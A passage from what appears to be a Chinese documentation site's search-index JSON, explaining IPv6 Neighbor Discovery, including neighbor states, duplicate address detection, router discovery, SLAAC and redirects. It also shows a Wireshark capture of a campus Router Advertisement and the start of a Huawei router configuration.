\u7684\u94fe\u8def\u5c42\u5730\u5740\u8fdb\u884c\u5355\u64ad\uff09\uff0cHost B \u7684\u94fe\u8def\u5c42\u5730\u5740\u88ab\u653e\u5728 Options \u5b57\u6bb5\u4e2d\u3002\u8fd9\u6837\u5c31\u5b8c\u6210\u4e86\u4e00\u4e2a\u5730\u5740\u89e3\u6790\u7684\u8fc7\u7a0b\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#\u8ddf\u8e2a\u90bb\u5c45\u72b6\u6001","title":"\u8ddf\u8e2a\u90bb\u5c45\u72b6\u6001","text":"<p>\u901a\u8fc7\u90bb\u5c45\u6216\u5230\u8fbe\u90bb\u5c45\u7684\u901a\u4fe1\uff0c\u4f1a\u56e0\u5404\u79cd\u539f\u56e0\u800c\u4e2d\u65ad\uff0c\u5305\u62ec\u786c\u4ef6\u6545\u969c\u3001\u63a5\u53e3\u5361\u7684\u70ed\u63d2\u5165\u7b49\u3002\u5982\u679c\u76ee\u7684\u5730\u5931\u6548\uff0c\u5219\u6062\u590d\u662f\u4e0d\u53ef\u80fd\u7684\uff0c\u901a\u4fe1\u5931\u8d25\uff1b\u5982\u679c\u8def\u5f84\u5931\u6548\uff0c\u5219\u6062\u590d\u662f\u53ef\u80fd\u7684\u3002\u56e0\u6b64\u8282\u70b9\u9700\u8981\u7ef4\u62a4\u4e00\u5f20\u90bb\u5c45\u8868\uff0c\u6bcf\u4e2a\u90bb\u5c45\u90fd\u6709\u76f8\u5e94\u7684\u72b6\u6001\uff0c\u72b6\u6001\u4e4b\u95f4\u53ef\u4ee5\u8fc1\u79fb\u3002</p> <p>RFC2461 \u4e2d\u5b9a\u4e49\u4e86 5 \u79cd\u90bb\u5c45\u72b6\u6001\uff0c\u5206\u522b\u662f\uff1a\u672a\u5b8c\u6210\uff08Incomplete\uff09\u3001\u53ef\u8fbe\uff08Reachable\uff09\u3001\u9648\u65e7\uff08Stale\uff09\u3001\u5ef6\u8fdf\uff08Delay\uff09\u3001\u63a2\u67e5\uff08Probe\uff09\u3002Empty \u8868\u793a\u90bb\u5c45\u8868\u9879\u4e3a\u7a7a\u3002</p>      \u90bb\u5c45\u72b6\u6001      <p>Example</p> <p>\u4e0b\u9762\u4ee5 A\u3001B \u4e24\u4e2a\u90bb\u5c45\u8282\u70b9\u4e4b\u95f4\u76f8\u4e92\u901a\u4fe1\u8fc7\u7a0b\u4e2d A \u8282\u70b9\u7684\u90bb\u5c45\u72b6\u6001\u53d8\u5316\u4e3a\u4f8b\uff08\u5047\u8bbe A\u3001B \u4e4b\u524d\u4ece\u672a\u901a\u4fe1\uff09\uff0c\u8bf4\u660e\u90bb\u5c45\u72b6\u6001\u8fc1\u79fb\u7684\u8fc7\u7a0b\u3002</p> <ol> <li>A \u5148\u53d1\u9001 NS \u62a5\u6587\uff0c\u5e76\u751f\u6210\u7f13\u5b58\u6761\u76ee\uff0c\u6b64\u65f6\uff0c\u90bb\u5c45\u72b6\u6001\u4e3a Incomplete\u3002</li> <li>\u82e5 B \u56de\u590d NA \u62a5\u6587\uff0c\u5219\u90bb\u5c45\u72b6\u6001\u7531 Incomplete \u53d8\u4e3a Reachable\uff0c\u5426\u5219\u56fa\u5b9a\u65f6\u95f4\u540e\u90bb\u5c45\u72b6\u6001\u7531 Incomplete \u53d8\u4e3a Empty\uff0c\u5373\u5220\u9664\u8868\u9879\u3002</li> <li>\u7ecf\u8fc7\u90bb\u5c45\u53ef\u8fbe\u65f6\u95f4\uff0c\u90bb\u5c45\u72b6\u6001\u7531 Reachable \u53d8\u4e3a Stale\uff0c\u5373\u672a\u77e5\u662f\u5426\u53ef\u8fbe\u3002</li> <li>\u5982\u679c\u5728 Reachable \u72b6\u6001\uff0cA \u6536\u5230 B \u7684\u975e\u8bf7\u6c42 NA \u62a5\u6587\uff0c\u4e14\u62a5\u6587\u4e2d\u643a\u5e26\u7684 B \u7684\u94fe\u8def\u5c42\u5730\u5740\u548c\u8868\u9879\u4e2d\u4e0d\u540c\uff0c\u5219\u90bb\u5c45\u72b6\u6001\u9a6c\u4e0a\u53d8\u4e3a Stale\u3002</li> <li>\u5728 Stale \u72b6\u6001\u82e5 A \u8981\u5411 B \u53d1\u9001\u6570\u636e\uff0c\u5219\u90bb\u5c45\u72b6\u6001\u7531 Stale \u53d8\u4e3a Delay\u3002</li> <li>\u5728\u7ecf\u8fc7\u4e00\u6bb5\u56fa\u5b9a\u65f6\u95f4\u540e\uff0c\u90bb\u5c45\u72b6\u6001\u7531 Delay \u53d8\u4e3a Probe\uff0c\u5219\u53d1\u9001 NS \u8bf7\u6c42\u3002\u5176\u95f4\u82e5\u6709 NA \u5e94\u7b54\uff0c\u5219\u90bb\u5c45\u72b6\u6001\u7531 Delay \u53d8\u4e3a Reachable\u3002</li> <li>\u5728 Probe \u72b6\u6001\uff0cA \u6bcf\u9694\u4e00\u5b9a\u65f6\u95f4\u95f4\u9694\u53d1\u9001\u5355\u64ad NS\uff0c\u53d1\u9001\u56fa\u5b9a\u6b21\u6570\u540e\uff0c\u6709\u5e94\u7b54\u5219\u90bb\u5c45\u72b6\u6001\u53d8\u4e3a Reachable\uff0c\u5426\u5219\u90bb\u5c45\u72b6\u6001\u53d8\u4e3a Empty\uff0c\u5373\u5220\u9664\u8868\u9879\u3002</li> </ol>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#\u91cd\u590d\u5730\u5740\u68c0\u6d4b","title":"\u91cd\u590d\u5730\u5740\u68c0\u6d4b","text":"<p>\u91cd\u590d\u5730\u5740\u68c0\u6d4b DAD\uff08Duplicate Address Detect\uff09\u662f\u5728\u63a5\u53e3\u4f7f\u7528\u67d0\u4e2a IPv6 \u5355\u64ad\u5730\u5740\u4e4b\u524d\u8fdb\u884c\u7684\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86\u63a2\u6d4b\u662f\u5426\u6709\u5176\u5b83\u7684\u8282\u70b9\u4f7f\u7528\u4e86\u8be5\u5730\u5740\u3002\u5c24\u5176\u662f\u5728\u5730\u5740\u81ea\u52a8\u914d\u7f6e\u7684\u65f6\u5019\uff0c\u8fdb\u884c DAD \u68c0\u6d4b\u662f\u5f88\u5fc5\u8981\u7684\u3002\u4e00\u4e2a IPv6 \u5355\u64ad\u5730\u5740\u5728\u5206\u914d\u7ed9\u4e00\u4e2a\u63a5\u53e3\u4e4b\u540e\u4e14\u901a\u8fc7\u91cd\u590d\u5730\u5740\u68c0\u6d4b\u4e4b\u524d\u79f0\u4e3a\u8bd5\u9a8c\u5730\u5740\uff08Tentative Address\uff09\u3002\u6b64\u65f6\u8be5\u63a5\u53e3\u4e0d\u80fd\u4f7f\u7528\u8fd9\u4e2a\u8bd5\u9a8c\u5730\u5740\u8fdb\u884c\u5355\u64ad\u901a\u4fe1\uff0c\u4f46\u662f\u4ecd\u7136\u4f1a\u52a0\u5165\u4e24\u4e2a\u7ec4\u64ad\u7ec4\uff1aALL-NODES \u7ec4\u64ad\u7ec4\u548c\u8bd5\u9a8c\u5730\u5740\u6240\u5bf9\u5e94\u7684 Solicited-Node \u7ec4\u64ad\u7ec4\u3002</p> <p>IPv6 \u91cd\u590d\u5730\u5740\u68c0\u6d4b\u6280\u672f\u548c IPv4 \u4e2d\u7684 ARP \u7c7b\u4f3c\uff1a\u8282\u70b9\u5411\u8bd5\u9a8c\u5730\u5740\u6240\u5bf9\u5e94\u7684 Solicited-Node \u7ec4\u64ad\u7ec4\u53d1\u9001 NS \u62a5\u6587\u3002NS \u62a5\u6587\u4e2d\u76ee\u6807\u5730\u5740\u5373\u4e3a\u8be5\u8bd5\u9a8c\u5730\u5740\u3002\u5982\u679c\u6536\u5230\u67d0\u4e2a\u5176\u4ed6\u7ad9\u70b9\u56de\u5e94\u7684 NA \u62a5\u6587\uff0c\u5c31\u8bc1\u660e\u8be5\u5730\u5740\u5df2\u88ab\u7f51\u7edc\u4e0a\u4f7f\u7528\uff0c\u8282\u70b9\u5c06\u4e0d\u80fd\u4f7f\u7528\u8be5\u8bd5\u9a8c\u5730\u5740\u901a\u8baf\u3002</p>      \u91cd\u590d\u5730\u5740\u68c0\u6d4b      <p>Example</p> <p>Host A \u7684 IPv6 \u5730\u5740 FC00::1 \u4e3a\u65b0\u914d\u7f6e\u5730\u5740\uff0c\u5373 FC00::1 \u4e3a Host A \u7684\u8bd5\u9a8c\u5730\u5740\u3002Host A \u5411 FC00::1 \u7684 Solicited-Node \u7ec4\u64ad\u7ec4\u53d1\u9001\u4e00\u4e2a\u4ee5 FC00::1 \u4e3a\u8bf7\u6c42\u7684\u76ee\u6807\u5730\u5740\u7684 NS \u62a5\u6587\u8fdb\u884c\u91cd\u590d\u5730\u5740\u68c0\u6d4b\uff0c\u7531\u4e8e FC00::1 \u5e76\u672a\u6b63\u5f0f\u6307\u5b9a\uff0c\u6240\u4ee5 NS \u62a5\u6587\u7684\u6e90\u5730\u5740\u4e3a\u672a\u6307\u5b9a\u5730\u5740\u3002\u5f53 Host B \u6536\u5230\u8be5 NS \u62a5\u6587\u540e\uff0c\u6709\u4e24\u79cd\u5904\u7406\u65b9\u6cd5\uff1a</p> <ul> <li>\u5982\u679c Host B \u53d1\u73b0 FC00::1 \u662f\u81ea\u8eab\u7684\u4e00\u4e2a\u8bd5\u9a8c\u5730\u5740\uff0c\u5219 Host B \u653e\u5f03\u4f7f\u7528\u8fd9\u4e2a\u5730\u5740\u4f5c\u4e3a\u63a5\u53e3\u5730\u5740\uff0c\u5e76\u4e14\u4e0d\u4f1a\u53d1\u9001 NA \u62a5\u6587\u3002</li> <li>\u5982\u679c Host B \u53d1\u73b0 FC00::1 \u662f\u4e00\u4e2a\u5df2\u7ecf\u6b63\u5e38\u4f7f\u7528\u7684\u5730\u5740\uff0cHost B \u4f1a\u5411 FF02::1 \u53d1\u9001\u4e00\u4e2a NA \u62a5\u6587\uff0c\u8be5\u6d88\u606f\u4e2d\u4f1a\u5305\u542b FC00::1\u3002\u8fd9\u6837\uff0cHost A \u6536\u5230\u8fd9\u4e2a\u6d88\u606f\u540e\u5c31\u4f1a\u53d1\u73b0\u81ea\u8eab\u7684\u8bd5\u9a8c\u5730\u5740\u662f\u91cd\u590d\u7684\u3002Host A \u4e0a\u8be5\u8bd5\u9a8c\u5730\u5740\u4e0d\u751f\u6548\uff0c\u88ab\u6807\u8bc6\u4e3a duplicated \u72b6\u6001\u3002</li> </ul>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#\u8def\u7531\u5668\u53d1\u73b0","title":"\u8def\u7531\u5668\u53d1\u73b0","text":"<p>\u8def\u7531\u5668\u53d1\u73b0\u529f\u80fd\u7528\u6765\u53d1\u73b0\u4e0e\u672c\u5730\u94fe\u8def\u76f8\u8fde\u7684\u8bbe\u5907\uff0c\u5e76\u83b7\u53d6\u4e0e\u5730\u5740\u81ea\u52a8\u914d\u7f6e\u76f8\u5173\u7684\u524d\u7f00\u548c\u5176\u4ed6\u914d\u7f6e\u53c2\u6570\u3002</p> <p>\u5728 IPv6 \u4e2d\uff0cIPv6 \u5730\u5740\u53ef\u4ee5\u652f\u6301\u65e0\u72b6\u6001\u7684\u81ea\u52a8\u914d\u7f6e\uff0c\u5373\u4e3b\u673a\u901a\u8fc7\u67d0\u79cd\u673a\u5236\u83b7\u53d6\u7f51\u7edc\u524d\u7f00\u4fe1\u606f\uff0c\u7136\u540e\u4e3b\u673a\u81ea\u5df1\u751f\u6210\u5730\u5740\u7684\u63a5\u53e3\u6807\u8bc6\u90e8\u5206\u3002\u8def\u7531\u5668\u53d1\u73b0\u529f\u80fd\u662f IPv6 \u5730\u5740\u81ea\u52a8\u914d\u7f6e\u529f\u80fd\u7684\u57fa\u7840\uff0c\u4e3b\u8981\u901a\u8fc7\u4ee5\u4e0b\u4e24\u79cd\u62a5\u6587\u5b9e\u73b0\uff1a</p> <ul> <li>\u8def\u7531\u5668\u901a\u544a RA\uff08Router Advertisement\uff09\u62a5\u6587\uff1a\u6bcf\u53f0\u8bbe\u5907\u4e3a\u4e86\u8ba9\u4e8c\u5c42\u7f51\u7edc\u4e0a\u7684\u4e3b\u673a\u548c\u8bbe\u5907\u77e5\u9053\u81ea\u5df1\u7684\u5b58\u5728\uff0c\u5b9a\u65f6\u90fd\u4f1a\u7ec4\u64ad\u53d1\u9001 RA \u62a5\u6587\uff0cRA \u62a5\u6587\u4e2d\u4f1a\u5e26\u6709\u7f51\u7edc\u524d\u7f00\u4fe1\u606f\uff0c\u53ca\u5176\u4ed6\u4e00\u4e9b\u6807\u5fd7\u4f4d\u4fe1\u606f\u3002</li> <li>\u8def\u7531\u5668\u8bf7\u6c42 RS\uff08Router Solicitation\uff09\u62a5\u6587\uff1a\u5f88\u591a\u60c5\u51b5\u4e0b\u4e3b\u673a\u63a5\u5165\u7f51\u7edc\u540e\u5e0c\u671b\u5c3d\u5feb\u83b7\u53d6\u7f51\u7edc\u524d\u7f00\u8fdb\u884c\u901a\u4fe1\uff0c\u6b64\u65f6\u4e3b\u673a\u53ef\u4ee5\u7acb\u523b\u53d1\u9001 RS \u62a5\u6587\uff0c\u7f51\u7edc\u4e0a\u7684\u8bbe\u5907\u5c06\u56de\u5e94 RA \u62a5\u6587\u3002</li> </ul>      \u8def\u7531\u5668\u53d1\u73b0","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#\u5730\u5740\u81ea\u52a8\u914d\u7f6eslaac","title":"\u5730\u5740\u81ea\u52a8\u914d\u7f6e\uff08SLAAC\uff09","text":"<p>IPv4 \u4f7f\u7528 DHCP \u5b9e\u73b0\u81ea\u52a8\u914d\u7f6e\uff0c\u5305\u62ec IP \u5730\u5740\uff0c\u7f3a\u7701\u7f51\u5173\u7b49\u4fe1\u606f\uff0c\u7b80\u5316\u4e86\u7f51\u7edc\u7ba1\u7406\u3002IPv6 \u5730\u5740\u589e\u957f\u4e3a 128 \u4f4d\uff0c\u4e14\u7ec8\u7aef\u8282\u70b9\u591a\uff0c\u5bf9\u4e8e\u81ea\u52a8\u914d\u7f6e\u7684\u8981\u6c42\u66f4\u4e3a\u8feb\u5207\uff0c\u9664\u4fdd\u7559\u4e86 DHCP \u4f5c\u4e3a\u6709\u72b6\u6001\u81ea\u52a8\u914d\u7f6e\u5916\uff0c\u8fd8\u589e\u52a0\u4e86\u65e0\u72b6\u6001\u81ea\u52a8\u914d\u7f6e\uff08StateLess Address AutoConfiguration\uff0cSLAAC\uff09\u3002\u65e0\u72b6\u6001\u81ea\u52a8\u914d\u7f6e\u5373\u81ea\u52a8\u751f\u6210\u94fe\u8def\u672c\u5730\u5730\u5740\uff0c\u4e3b\u673a\u6839\u636e RA \u62a5\u6587\u7684\u524d\u7f00\u4fe1\u606f\uff0c\u81ea\u52a8\u914d\u7f6e\u5168\u7403\u5355\u64ad\u5730\u5740\u7b49\uff0c\u5e76\u83b7\u5f97\u5176\u4ed6\u76f8\u5173\u4fe1\u606f\u3002</p> <p>IPv6 \u4e3b\u673a\u65e0\u72b6\u6001\u81ea\u52a8\u914d\u7f6e\u8fc7\u7a0b\uff1a</p> <ol> <li>\u6839\u636e\u63a5\u53e3\u6807\u8bc6\u4ea7\u751f\u94fe\u8def\u672c\u5730\u5730\u5740\u3002</li> <li>\u53d1\u51fa\u90bb\u5c45\u8bf7\u6c42\uff0c\u8fdb\u884c\u91cd\u590d\u5730\u5740\u68c0\u6d4b\u3002</li> <li>\u5982\u5730\u5740\u51b2\u7a81\uff0c\u5219\u505c\u6b62\u81ea\u52a8\u914d\u7f6e\uff0c\u9700\u8981\u624b\u5de5\u914d\u7f6e\u3002</li> <li>\u5982\u4e0d\u51b2\u7a81\uff0c\u94fe\u8def\u672c\u5730\u5730\u5740\u751f\u6548\uff0c\u8282\u70b9\u5177\u5907\u672c\u5730\u94fe\u8def\u901a\u4fe1\u80fd\u529b\u3002</li> <li>\u4e3b\u673a\u4f1a\u53d1\u9001 RS \u62a5\u6587\uff08\u6216\u63a5\u6536\u5230\u8bbe\u5907\u5b9a\u671f\u53d1\u9001\u7684 RA \u62a5\u6587\uff09\u3002</li> <li>\u6839\u636e RA \u62a5\u6587\u4e2d\u7684\u524d\u7f00\u4fe1\u606f\u548c\u63a5\u53e3\u6807\u8bc6\u5f97\u5230 IPv6 \u5730\u5740\u3002</li> </ol> <p>\u4ece\u7b2c 6 \u6b65\u53ef\u4ee5\u77e5\u9053\uff0c\u5982\u679c\u6ca1\u6709 RA \u62a5\u6587\uff0c\u5219\u65e0\u6cd5\u8fdb\u884c SLAAC \u81ea\u52a8\u914d\u7f6e\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#\u9ed8\u8ba4\u8def\u7531\u5668\u4f18\u5148\u7ea7\u548c\u8def\u7531\u4fe1\u606f\u53d1\u73b0","title":"\u9ed8\u8ba4\u8def\u7531\u5668\u4f18\u5148\u7ea7\u548c\u8def\u7531\u4fe1\u606f\u53d1\u73b0","text":"<p>\u5f53\u4e3b\u673a\u6240\u5728\u7684\u94fe\u8def\u4e2d\u5b58\u5728\u591a\u4e2a\u8bbe\u5907\u65f6\uff0c\u4e3b\u673a\u9700\u8981\u6839\u636e\u62a5\u6587\u7684\u76ee\u7684\u5730\u5740\u9009\u62e9\u8f6c\u53d1\u8bbe\u5907\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8bbe\u5907\u901a\u8fc7\u53d1\u5e03\u9ed8\u8ba4\u8def\u7531\u4f18\u5148\u7ea7\u548c\u7279\u5b9a\u8def\u7531\u4fe1\u606f\u7ed9\u4e3b\u673a\uff0c\u63d0\u9ad8\u4e3b\u673a\u6839\u636e\u4e0d\u540c\u7684\u76ee\u7684\u5730\u9009\u62e9\u5408\u9002\u7684\u8f6c\u53d1\u8bbe\u5907\u7684\u80fd\u529b\u3002</p> <p>\u5728 RA \u62a5\u6587\u4e2d\uff0c\u5b9a\u4e49\u4e86\u9ed8\u8ba4\u8def\u7531\u4f18\u5148\u7ea7\u548c\u8def\u7531\u4fe1\u606f\u4e24\u4e2a\u5b57\u6bb5\uff0c\u5e2e\u52a9\u4e3b\u673a\u5728\u53d1\u9001\u62a5\u6587\u65f6\u9009\u62e9\u5408\u9002\u7684\u8f6c\u53d1\u8bbe\u5907\u3002</p> <p>\u4e3b\u673a\u6536\u5230\u5305\u542b\u8def\u7531\u4fe1\u606f\u7684 RA \u62a5\u6587\u540e\uff0c\u4f1a\u66f4\u65b0\u81ea\u5df1\u7684\u8def\u7531\u8868\u3002\u5f53\u4e3b\u673a\u5411\u5176\u4ed6\u8bbe\u5907\u53d1\u9001\u62a5\u6587\u65f6\uff0c\u901a\u8fc7\u67e5\u8be2\u8be5\u5217\u8868\u7684\u8def\u7531\u4fe1\u606f\uff0c\u9009\u62e9\u5408\u9002\u7684\u8def\u7531\u53d1\u9001\u62a5\u6587\u3002</p> <p>\u4e3b\u673a\u6536\u5230\u5305\u542b\u9ed8\u8ba4\u8bbe\u5907\u4f18\u5148\u7ea7\u4fe1\u606f\u7684 RA \u62a5\u6587\u540e\uff0c\u4f1a\u66f4\u65b0\u81ea\u5df1\u7684\u9ed8\u8ba4\u8def\u7531\u5217\u8868\u3002\u5f53\u4e3b\u673a\u5411\u5176\u4ed6\u8bbe\u5907\u53d1\u9001\u62a5\u6587\u65f6\uff0c\u5982\u679c\u6ca1\u6709\u8def\u7531\u53ef\u9009\uff0c\u5219\u9996\u5148\u67e5\u8be2\u8be5\u5217\u8868\uff0c\u7136\u540e\u9009\u62e9\u672c\u94fe\u8def\u5185\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u8bbe\u5907\u53d1\u9001\u62a5\u6587\uff1b\u5982\u679c\u8be5\u8bbe\u5907\u6545\u969c\uff0c\u4e3b\u673a\u6839\u636e\u4f18\u5148\u7ea7\u4ece\u9ad8\u5230\u4f4e\u7684\u987a\u5e8f\uff0c\u4f9d\u6b21\u9009\u62e9\u5176\u4ed6\u8bbe\u5907\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#\u91cd\u5b9a\u5411","title":"\u91cd\u5b9a\u5411","text":"<p>\u5f53\u7f51\u5173\u8bbe\u5907\u53d1\u73b0\u62a5\u6587\u4ece\u5176\u5b83\u7f51\u5173\u8bbe\u5907\u8f6c\u53d1\u66f4\u597d\uff0c\u5b83\u5c31\u4f1a\u53d1\u9001\u91cd\u5b9a\u5411\u62a5\u6587\u544a\u77e5\u62a5\u6587\u7684\u53d1\u9001\u8005\uff0c\u8ba9\u62a5\u6587\u53d1\u9001\u8005\u9009\u62e9\u53e6\u4e00\u4e2a\u7f51\u5173\u8bbe\u5907\u3002\u91cd\u5b9a\u5411\u62a5\u6587\u4e5f\u627f\u8f7d\u5728 ICMPv6 \u62a5\u6587\u4e2d\uff0c\u62a5\u6587\u4e2d\u4f1a\u643a\u5e26\u66f4\u597d\u7684\u8def\u5f84\u4e0b\u4e00\u8df3\u5730\u5740\u548c\u9700\u8981\u91cd\u5b9a\u5411\u8f6c\u53d1\u7684\u62a5\u6587\u7684\u76ee\u7684\u5730\u5740\u7b49\u4fe1\u606f\u3002</p>      \u91cd\u5b9a\u5411      <p>Exmaple</p> <p>Host A \u9700\u8981\u548c Host B \u901a\u4fe1\uff0cHost A \u7684\u9ed8\u8ba4\u7f51\u5173\u8bbe\u5907\u662f Router A\uff0c\u5f53 Host A \u53d1\u9001\u62a5\u6587\u7ed9 Host B \u65f6\u62a5\u6587\u4f1a\u88ab\u9001\u5230 Router A\u3002Router A \u63a5\u6536\u5230 Host A \u53d1\u9001\u7684\u62a5\u6587\u4ee5\u540e\u4f1a\u53d1\u73b0\u5b9e\u9645\u4e0a Host A \u76f4\u63a5\u53d1\u9001\u7ed9 Router B \u66f4\u597d\uff0c\u5b83\u5c06\u53d1\u9001\u4e00\u4e2a\u91cd\u5b9a\u5411\u62a5\u6587\u7ed9\u4e3b\u673a A\uff0c\u5176\u4e2d\u62a5\u6587\u4e2d\u66f4\u597d\u7684\u8def\u5f84\u4e0b\u4e00\u8df3\u5730\u5740\u4e3a Router B\uff0cDestination Address \u4e3a Host B\u3002Host A \u63a5\u6536\u5230\u4e86\u91cd\u5b9a\u5411\u62a5\u6587\u4e4b\u540e\uff0c\u4f1a\u5728\u9ed8\u8ba4\u8def\u7531\u8868\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u4e3b\u673a\u8def\u7531\uff0c\u4ee5\u540e\u53d1\u5f80 Host B \u7684\u62a5\u6587\u5c31\u76f4\u63a5\u53d1\u9001\u7ed9 Router B\u3002</p> <p>\u5f53\u8bbe\u5907\u6536\u5230\u4e00\u4e2a\u62a5\u6587\u540e\uff0c\u53ea\u6709\u5728\u5982\u4e0b\u60c5\u51b5\u4e0b\uff0c\u8bbe\u5907\u4f1a\u5411\u62a5\u6587\u53d1\u9001\u8005\u53d1\u9001\u91cd\u5b9a\u5411\u62a5\u6587\uff1a</p> <ul> <li>\u62a5\u6587\u7684\u76ee\u7684\u5730\u5740\u4e0d\u662f\u4e00\u4e2a\u7ec4\u64ad\u5730\u5740\u3002</li> <li>\u62a5\u6587\u5e76\u975e\u901a\u8fc7\u8def\u7531\u8f6c\u53d1\u7ed9\u8bbe\u5907\u3002</li> <li>\u7ecf\u8fc7\u8def\u7531\u8ba1\u7b97\u540e\uff0c\u8def\u7531\u7684\u4e0b\u4e00\u8df3\u51fa\u63a5\u53e3\u662f\u63a5\u6536\u62a5\u6587\u7684\u63a5\u53e3\u3002</li> <li>\u8bbe\u5907\u53d1\u73b0\u62a5\u6587\u7684\u6700\u4f73\u4e0b\u4e00\u8df3 IP \u5730\u5740\u548c\u62a5\u6587\u7684\u6e90 IP \u5730\u5740\u5904\u4e8e\u540c\u4e00\u7f51\u6bb5\u3002</li> <li>\u8bbe\u5907\u68c0\u67e5\u62a5\u6587\u7684\u6e90\u5730\u5740\uff0c\u53d1\u73b0\u81ea\u8eab\u7684\u90bb\u5c45\u8868\u9879\u4e2d\u6709\u7528\u8be5\u5730\u5740\u4f5c\u4e3a\u5168\u7403\u5355\u64ad\u5730\u5740\u6216\u94fe\u8def\u672c\u5730\u5730\u5740\u7684\u90bb\u5c45\u5b58\u5728\u3002</li> </ul>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#ipv6-\u5b9e\u8df5","title":"IPv6 \u5b9e\u8df5","text":"","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#\u6821\u56ed\u7f51-slaac","title":"\u6821\u56ed\u7f51 SLAAC","text":"<p>\u76ee\u524d\uff0c\u4e1c\u56db\u6559\u5b66\u697c\uff08\u5373\u96c6\u7fa4\u6240\u5728\u533a\u57df\uff09\u91c7\u7528 SLAAC \u81ea\u52a8\u914d\u7f6e\uff0c\u8ba9\u6211\u4eec\u6765\u770b\u4e00\u4e0b SLAAC \u81ea\u52a8\u914d\u7f6e\u7684\u8fc7\u7a0b\u3002</p>      WireShark \u6293\u53d6\u5230\u7684 RS\u3001RA \u62a5\u6587      <p>\u4e0a\u56fe\u5c55\u793a\u4e86\u5728\u6821\u56ed\u7f51\u6293\u5305\u65f6\u6355\u83b7\u5230\u7684 RS \u548c RA \u62a5\u6587\u3002\u53ef\u4ee5\u770b\u5230\u8bbe\u5907\u63a5\u5165\u7f51\u7edc\u540e\u5411 <code>FF02::2</code> \u7ec4\u64ad\u5730\u5740\u53d1\u9001 RS \u62a5\u6587\uff08\u8fd8\u8bb0\u5f97\u8fd9\u4e2a\u7ec4\u64ad\u5730\u5740\u4ee3\u8868\u4ec0\u4e48\u5417\uff1f\uff09\uff0c\u8def\u7531\u5668\u63a5\u6536\u5230 RS \u62a5\u6587\u540e\uff0c\u5411 <code>FF02::1</code> \u7ec4\u64ad\u5730\u5740\u53d1\u9001 RA \u62a5\u6587\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u524d\u7f00\u4fe1\u606f\u3002\u5728\u4e0a\u56fe\u4e2d\u603b\u662f\u80fd\u770b\u5230\u4e24\u4e2a RA \u62a5\u6587\uff0c\u5176\u4e2d\u7b2c\u4e8c\u4e2a RA \u62a5\u6587\u5230\u8fbe\u7684\u65f6\u95f4\u665a\u7ea6 0.3 \u79d2\u3002\u6211\u4eec\u53d6\u5176\u4e2d\u4e00\u4e2a RA \u62a5\u6587\u8fdb\u884c\u5206\u6790\uff1a</p> <pre><code>Internet Control Message Protocol v6\n    Type: Router Advertisement (134)\n    Code: 0\n    Checksum: 0x89b9 [correct]\n    [Checksum Status: Good]\n    Cur hop limit: 64\n    Flags: 0x00, Prf (Default Router Preference): Medium\n    Router lifetime (s): 1800\n    Reachable time (ms): 0\n    Retrans timer (ms): 0\n    ICMPv6 Option (Source link-layer address : 9c:06:1b:0b:d2:01)\n        Type: Source link-layer address (1)\n        Length: 1 (8 bytes)\n        Link-layer address: H3CTechnolog_0b:d2:01 (9c:06:1b:0b:d2:01)\n    ICMPv6 Option (MTU : 1500)\n        Type: MTU (5)\n        Length: 1 (8 bytes)\n        Reserved\n        MTU: 1500\n    ICMPv6 Option (Prefix information : 2001:da8:e000:731a::/64)\n        Type: Prefix information (3)\n        Length: 4 (32 bytes)\n        Prefix Length: 64\n        Flag: 0xc0, On-link flag(L), Autonomous address-configuration flag(A)\n        Valid Lifetime: 2592000 (30 days)\n        Preferred Lifetime: 604800 (7 days)\n        Reserved\n        Prefix: 2001:da8:e000:731a::\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 RA \u62a5\u6587\u4e2d\u643a\u5e26\u4e86\u524d\u7f00\u4fe1\u606f\u3002\u8bbe\u5907\u6536\u5230 RA \u62a5\u6587\u540e\uff0c\u6839\u636e\u524d\u7f00\u4fe1\u606f\u81ea\u52a8\u914d\u7f6e IPv6 \u5730\u5740\u3002\u8fd9\u4e00\u8fc7\u7a0b\u901a\u5e38\u91c7\u7528 EUI-64 \u7b97\u6cd5\uff0c\u5373\u5c06 MAC \u5730\u5740\u7684\u4e2d\u95f4 16 \u4f4d <code>FFFE</code> \u63d2\u5165\u5230 MAC \u5730\u5740\u7684\u4e2d\u95f4\uff0c\u7136\u540e\u5c06\u7b2c 7 \u4f4d\u53d6\u53cd\uff0c\u4f5c\u4e3a\u63a5\u53e3\u6807\u8bc6\u3002</p> <p>\u5982\u679c\u6536\u5230\u4e86\u591a\u4e2a RA \u62a5\u6587\uff0c\u5e76\u4e14\u8fd9\u4e9b\u62a5\u6587\u4e2d\u7684\u524d\u7f00\u4fe1\u606f\u4e0d\u540c\uff0c\u5219\u8bbe\u5907\u4f1a\u5177\u6709\u591a\u4e2a SLAAC \u7684 IPv6 \u5730\u5740\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#\u534e\u4e3a\u8def\u7531\u5668\u914d\u7f6e-slaac","title":"\u534e\u4e3a\u8def\u7531\u5668\u914d\u7f6e SLAAC","text":"<p>\u8981\u5728\u5c40\u57df\u7f51\u4e2d\u914d\u7f6e SLAAC\uff0c\u5c31\u662f\u8981\u5728\u8def\u7531\u5668\u4e0a\u914d\u7f6e RA \u62a5\u6587\u53d1\u9001\u3002\u5728\u534e\u4e3a\u8def\u7531\u5668\u6587\u6863\u4e2d\uff0c\u8fd9\u5757\u5185\u5bb9\u4f4d\u4e8e\u201c\u914d\u7f6e\u90bb\u5c45\u53d1\u73b0\u529f\u80fd\u201d\u7ae0\u8282\u3002\u7f3a\u7701\u60c5\u51b5\u4e0b\uff0cRA \u62a5\u6587\u4e2d\u7684\u524d\u7f00\u4fe1\u606f\u4e3a\u53d1\u9001 RA \u62a5\u6587\u63a5\u53e3\u6240\u5728\u94fe\u8def\u7684\u7f51\u7edc\u524d\u7f00\u3002</p> <pre><code>interface interface-type interface-number\n# \u5f00\u542f IPv6 RA 